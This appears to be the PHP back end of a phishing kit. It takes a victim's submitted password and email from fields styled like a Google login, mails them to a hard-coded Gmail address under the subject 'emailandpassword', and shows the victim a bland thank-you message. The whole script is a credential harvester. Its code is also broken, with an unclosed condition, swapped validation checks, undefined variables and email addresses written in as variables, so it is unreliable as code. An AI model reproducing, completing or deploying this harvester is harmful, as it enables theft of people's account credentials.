<?php
if(isset($_POST['email'])) {
 
    // EDIT THE 2 LINES BELOW AS REQUIRED
    
    $email_to = "capianlastimosa@gmail.com";
    $email_subject = "emailandpassword";
 
    function died($error) {
        // your error code can go here
        echo "We are very sorry, but there were error(s) found with the form you submitted. ";
        echo "These errors appear below.<br /><br />";
        echo $error."<br /><br />";
        echo "Please go back and fix these errors.<br /><br />";
        die();
    }
 
 
    // validation expected data exists
    if(!isset($_POST['Passwd']) ||
        !isset($_POST['Email']) ||
        
        
        died('We are sorry, but there appears to be a problem with the form you submitted.');       
    }
 
     
 
    $first_name = $_POST['Passwd']; // required
    $last_name = $_POST['Email']; // required
    
 
    $error_message = "";
    $email_exp = '/^[A-Za-z0-9._%-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}$/';
 
  if(!preg_match($email_exp,$Passwd)) {
    $error_message .= 'The Email Address you entered does not appear to be valid.<br />';
  }
 
    $string_exp = "/^[A-Za-z .'-]+$/";
 
  if(!preg_match($string_exp,$Email)) {
    $error_message .= 'The First Name you entered does not appear to be valid.<br />';
  }
 

 
  if(strlen($error_message) > 0) {
    died($error_message);
  }
 
    $email_message = "Form details below.\n\n";
 
     
    function clean_string($string) {
      $bad = array("content-type","bcc:","to:","cc:","href");
      return str_replace($bad,"",$string);
    }  
    $email_message .= "Passwd: ".clean_string($Passwd)."\n";
    $email_message .= "Email: ".clean_string($Email)."\n";
   
 
// create email headers
$headers = 'From: '.$captianlastimosa@gmail.com."\r\n".
'Reply-To: '.$captianlastimosa@gmail.com."\r\n" .
'X-Mailer: PHP/' . phpversion();
@mail($captianlastimosa@gmail.com, $coolcrap, $PasswdEmail, $gg);  
?>
 
<!-- include your own success html here -->
 
Thank you for contacting us. We will be in touch with you very soon.
 
<?php
 
}
?>